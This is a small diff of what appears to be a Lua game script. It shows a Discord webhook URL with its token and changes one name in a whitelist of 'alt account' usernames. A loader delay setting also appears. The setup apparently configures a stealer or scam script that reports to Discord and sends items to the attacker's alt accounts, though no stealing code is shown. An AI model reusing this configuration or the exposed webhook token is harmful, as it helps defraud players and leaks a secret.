@@ -15,7 +15,7 @@ local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OB
 -- >>> PUT YOUR ALT ACCOUNT'S EXACT USERNAME HERE <<<
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
-    ["mythicalop123456"] = true,
+    ["blueno_op1"] = true,
 }
 
 local LOADER_SECONDS      = 180
